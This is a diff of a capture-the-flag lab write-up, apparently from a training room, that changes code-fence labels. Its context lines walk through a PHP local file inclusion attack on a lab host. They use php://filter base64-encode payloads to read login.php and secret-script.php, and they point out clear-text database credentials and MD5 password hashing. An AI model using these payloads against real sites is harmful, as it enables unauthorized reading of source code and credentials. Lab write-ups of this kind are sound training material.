@@ -130,7 +130,7 @@ mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 4. Further investigating the app I landed on `Orders` page where the PHP filter is used `http://10.10.213.211/secret-script.php?file=php://filter/resource=orders.html`
 5. Using the base64 encoding with filter we can exfiltrate the content of the PHP file; for this we can use the filter with `http://10.10.213.211/secret-script.php?file=php://filter/read=convert.base64-encode/resource=login.php` to check the content and validations for login page
 6. This payload will return the base64 encoded version of `login.php` page (we can use the Burp Suite Decoder, or Linux based tools to decode):
-```php
+```sh
 <?php
 // Replace these with your database credentials
 $servername = "localhost";
@@ -187,7 +187,7 @@ $conn->close();
 ```
 7. Checking the PHP script we can see the DB user details in clear (user/password) and see the hashing algorithm used for storing passwords in DB is MD5 
 8. Another interesting file to check is `secret-script.php`:
-```php
+```sh
 <?php
   //echo "Hello World";
   if(isset($_GET['file'])) {
